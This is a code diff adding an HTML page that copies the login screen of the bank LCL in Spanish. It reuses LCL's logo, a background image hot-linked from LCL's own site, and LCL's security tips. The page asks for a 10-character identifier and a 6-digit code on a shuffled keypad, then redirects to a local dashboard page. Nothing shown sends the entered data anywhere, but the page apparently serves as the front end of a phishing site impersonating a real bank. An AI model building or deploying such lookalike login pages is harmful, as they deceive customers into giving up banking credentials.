@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="logo.svg" type="image/x-icon">
+  <title>ACCESO - LCL</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      min-height: 865px;
+    }
+    .left {
+  width: 26%; /* réduit de 30% à 26% */
+  background: #fff;
+  padding: 30px;
+  display: flex;
+  flex-direction: column;
+  
+  align-items: center;
+  font-size: 14px; /* réduction taille des textes */
+  margin-top:1px;
+}
+
+h2 {
+  margin-bottom: 10px;
+  font-size: 16px; /* réduction titre */
+}
+
+    .right {
+      width: 100%;
+      background: url('https://monespace.lcl.fr/assets/images/login-page-background.jpg') no-repeat center center;
+      background-size: cover;
+      position: relative;
+      display: flex;
+      align-items: flex-end;
+      justify-content: center;
+      padding-bottom: 30px;
+      text-align: center;
+      
+    }
+    .logo {
+      margin-bottom: 10px;
+    }
+    
+    .input-id {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+    .input-id input {
+      width: 25px;
+      height: 40px;
+      font-size: 20px;
+      text-align: center;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      outline: none;
+    }
+    .input-id input:focus {
+      border-bottom: 2px solid #2a2ac0;
+    }
+    .remember {
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 10px 20px;
+      background: #999;
+      border: none;
+      color: white;
+      border-radius: 25px;
+      cursor: not-allowed;
+      margin-bottom: 20px;
+      transition: background 0.3s;
+    }
+    button.active {
+      background: #2a2ac0;
+      cursor: pointer;
+    }
+    .links{
+      
+    list-style-type: none;
+    margin: 0;
+    padding: 0;
+    text-align: center;
+    
+    }
+    .links a {
+    padding-bottom: 1px;
+        text-decoration: underline;
+        text-decoration-color: #3b51d5;
+        text-underline-offset: 5px;
+        border-bottom: none;
+    }
+    
+    .open-account {
+      margin-top: 15px;
+    }
+    .open-account a {
+      background: #2a2ac0;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 25px;
+      text-decoration: none;
+      display: inline-block;
+      
+    }
+    .open-accounte{
+      margin-left: 25px;
+    }
+    .open-account p {
+      margin-bottom: 1px;
+     
+    }
+    .open-account p a {
+      color: #232884;
+      text-decoration: underline;
+      background: none;
+      font-size: 20px;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    .slider {
+      display: flex;
+      gap: 20px;
+      overflow-x: auto;
+      scroll-behavior: smooth;
+      scrollbar-width: none;
+    }
+    .slider::-webkit-scrollbar {
+      display: none;
+    }
+    .slide {
+      background: #FFFF;
+      padding: 20px;
+      margin: 0px 10px 15px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      display: flex;
+      gap: 15px;
+      align-items: flex-start;
+      flex-shrink: 0;
+    }
+    .slide img {
+      width: 50px;
+      height: auto;
+    }
+    .slide h3 {
+      margin: 0px 0px 10px 35px ;
+      font-size: 14px ;
+      color: #232884;
+    }
+    .slide p {
+      font-size: 12px;
+      margin-top: 10px 0px 0px;
+      color: #202122;
+      text-align: left;
+    }
+    .slide a {
+      color: #1F368B;
+      font-size: 14px;
+      text-align: left;
+    }
+
+    /* ✅ Partie ajoutée : style pour le code personnel */
+    #codePersonnel {
+      display: none;
+      text-align: center;
+    }
+    #codePersonnel h2 {
+      margin-top: 20px;
+      margin-bottom: 10px;
+      color: #1F3688;
+    }
+    #dots {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      border: 1px solid #333;
+    }
+    #numpad {
+  display: grid;
+  grid-template-columns: repeat(5, 40px);
+  gap: 10px;
+  justify-content: center;
+  margin-bottom: 20px;
+}
+
+#numpad button {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  border: none;
+  background-color: #f0f3ff;
+  font-size: 16px;
+  cursor: pointer;
+  color: black; /* noir pour les chiffres */
+}
+
+
+
+   @media screen and (max-width: 768px) {
+    body {
+      flex-direction: column;
+      height: 100vh;
+    }
+    .left, .right {
+      width: 100%;
+    }
+    .right {
+      display: none;
+      height: 0;
+      overflow: hidden;
+    }
+    .left {
+      height: 100%;
+      padding: 20px;
+      box-sizing: border-box;
+      justify-content: center;
+      align-items: center;
+      display: flex;
+      flex-direction: column;
+    }
+    .input-id {
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    .input-id input {
+      width: 30px;
+      height: 45px;
+      font-size: 18px;
+    }
+    button {
+      width: 80%;
+      max-width: 300px;
+    }
+  }
+  </style>
+</head>
+<body>
+  <div class="left">
+   <div class="logo">
+      <img src="logo.svg" alt="LCL Logo" width="100">
+    </div>
+    <h2>Su identificador</h2>
+    <div class="input-id">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+      <input type="text" maxlength="1">
+    </div>
+    <label class="remember">
+      <input type="checkbox"> Recordar mi identificador
+    </label>
+    <button id="continueBtn">Continuar →</button>
+
+    <!-- ✅ Zone cachée du code personnel -->
+<div id="codePersonnel">
+  <h2>Su código personal</h2>
+  <div id="dots">
+    <span class="dot"></span>
+    <span class="dot"></span>
+    <span class="dot"></span>
+    <span class="dot"></span>
+    <span class="dot"></span>
+    <span class="dot"></span>
+  </div>
+  <div id="numpad"></div>
+  <button id="validateCode" disabled style="padding:10px 25px;border:none;border-radius:25px;background:#999;color:white;cursor:not-allowed;">Validar →</button>
+</div>
+
+    <div class="links">
+      <a href="#">¿Olvidó su identificador?</a> <br>
+      <a href="#">¿Olvidó su código personal?</a>
+    </div>
+    <div class="open-account">
+      <p><a href="#">¿Aún no es cliente?</a></p>
+      <a href="#" class="open-accounte">Abrir una cuenta →</a>
+    </div>
+  </div>
+  <div class="right">
+    <div class="slider">
+      <div class="slide">
+        <img src="arrow_links.svg" alt="Icon">
+        <div>
+          <h3>Nuestros consejos de seguridad</h3>
+          <p>LCL nunca le pedirá (por correo electrónico, SMS o teléfono) que comunique de ninguna manera sus contraseñas, códigos confidenciales o códigos de un solo uso recibidos por SMS.</p>
+          <a href="#">Cómo asegurar mis datos bancarios</a>
+        </div>
+      </div>
+      <div class="slide">
+        <img src="arrow_links.svg" alt="Icon">
+        <div>
+          <h3>Nuestros consejos de seguridad</h3>
+          <p>Descubra los buenos hábitos para proteger su ordenador y sus datos bancarios a diario.</p>
+          <a href="#">Ir a LCL seguridad</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  const inputs = document.querySelectorAll('.input-id input');
+  const button = document.getElementById('continueBtn');
+  const codeSection = document.getElementById('codePersonnel');
+  const numpad = document.getElementById('numpad');
+  const dots = document.querySelectorAll('#dots .dot');
+  const validateCodeBtn = document.getElementById('validateCode');
+
+  let code = []; // tableau des chiffres tapés
+
+  inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      if (input.value.length === 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+      checkInputs();
+    });
+    input.addEventListener('keydown', (e) => {
+      if (e.key === "Backspace" && input.value === "" && index > 0) {
+        inputs[index - 1].focus();
+      }
+    });
+  });
+
+  function checkInputs() {
+    const allFilled = Array.from(inputs).every(input => input.value.trim().length === 1);
+    if (allFilled) {
+      button.classList.add('active');
+      button.disabled = false;
+    } else {
+      button.classList.remove('active');
+      button.disabled = true;
+    }
+  }
+
+  button.addEventListener('click', () => {
+    if (!button.disabled) {
+      codeSection.style.display = 'block';
+      generateNumpad();
+    }
+  });
+
+ function generateNumpad() {
+  const digits = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0].sort(() => 0.5 - Math.random());
+  numpad.innerHTML = '';
+
+  digits.forEach(num => {
+    const btn = document.createElement('button');
+    btn.textContent = num;
+    btn.style.color = 'black';
+    btn.addEventListener('click', () => enterCode(num));
+    numpad.appendChild(btn);
+  });
+
+  // Ajouter le bouton "Supprimer"
+  const deleteBtn = document.createElement('button');
+  deleteBtn.textContent = '←';
+  deleteBtn.style.color = 'black';
+  deleteBtn.addEventListener('click', () => {
+    if (code.length > 0) {
+      dots[code.length - 1].style.backgroundColor = 'transparent';
+      code.pop();
+
+      // désactiver bouton valider si moins de 6 chiffres
+      validateCodeBtn.disabled = true;
+      validateCodeBtn.style.backgroundColor = '#999';
+      validateCodeBtn.style.cursor = 'not-allowed';
+    }
+  });
+  numpad.appendChild(deleteBtn);
+}
+
+  function enterCode(digit) {
+    if (code.length >= 6) return;
+
+    code.push(digit);
+
+    // Mettre à jour les points
+    dots[code.length - 1].style.backgroundColor = '#1F3688';
+
+    if (code.length === 6) {
+      validateCodeBtn.disabled = false;
+      validateCodeBtn.style.backgroundColor = '#2a2ac0';
+      validateCodeBtn.style.cursor = 'pointer';
+    }
+  }
+  
+validateCodeBtn.addEventListener('click', () => {
+  window.location.href = 'dashboard.html';
+});
+
+
+</script>
+</body>
+</html>
